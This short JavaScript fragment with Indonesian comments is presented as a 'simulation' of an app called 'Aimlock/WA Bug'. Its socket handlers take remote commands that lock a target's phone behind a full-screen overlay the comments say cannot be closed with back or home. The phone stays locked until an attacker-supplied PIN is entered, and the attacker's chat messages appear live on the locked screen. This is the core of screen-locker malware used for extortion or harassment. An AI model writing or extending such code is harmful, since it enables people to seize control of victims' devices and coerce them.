// Simulasi di aplikasi Aimlock/WA Bug
socket.on('command-lock', (data) => {
    // 1. Munculkan Overlay Full Screen (Gak bisa di-back/home)
    showOverlay(data.msg); 
    
    // 2. Set variabel PIN lokal untuk verifikasi buka kunci
    let requiredPin = data.securePin;
    console.log("Device Locked. Waiting for PIN: " + requiredPin);
});

socket.on('incoming-chat', (msg) => {
    // Munculkan teks chat secara real-time di layar lock target
    updateLiveChatUI(msg);
});
